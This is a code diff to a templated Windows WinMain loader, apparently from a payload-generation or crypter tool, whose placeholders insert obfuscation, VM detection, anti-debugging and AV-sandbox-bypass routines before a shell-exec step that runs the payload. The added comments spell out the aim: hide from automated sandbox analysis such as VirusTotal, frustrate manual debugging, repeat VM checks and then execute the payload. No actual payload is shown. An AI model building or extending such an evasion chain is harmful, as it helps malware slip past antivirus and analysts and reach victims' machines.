@@ -59,9 +59,12 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, in
     {{obf:*}}
     {{caller-init}}
 
+    // Check for the presence of the VM to stop sandbox analysis. For example, the VirusTotal sandbox.
+    // This will hide further anti-debugging methods from automated analysis.
     // {{obf:*}} {{vmd:cpuid}}
     // {{obf:*}} {{vmd:*}}
 
+    // Check for the presence of a debugger to stop or make manual debugging difficult.
     {{obf:*}} {{dbg:*}}
     {{obf:*}} {{dbg:*}}
     {{obf:*}} {{dbg:*}}
@@ -75,13 +78,20 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInstance, LPSTR lpCmdLine, in
         {{obf:*}}
         return 0;
     }
-    
+
+    // The VM presence checks performed before anti-debugging methods may be easily
+    // detected and disabled using manual debugging. So repeat them again.
+    // {{obf:*}} {{vmd:cpuid}}
+    // {{obf:*}} {{vmd:*}}
+
+    // Finally, try to bypass the AV sandbox.
     {{obf:*}} {{snd:clone}}
     {{obf:*}} {{snd:query_performance_counter,rdtsc}}
     {{obf:*}} {{snd:*}}
     {{obf:*}} {{snd:*}}
     {{obf:*}} {{snd:query_performance_counter,rdtsc}}
     
+    // Run the payload.
     {{obf:*}} {{shell-exec}}
     {{obf:*}}
 
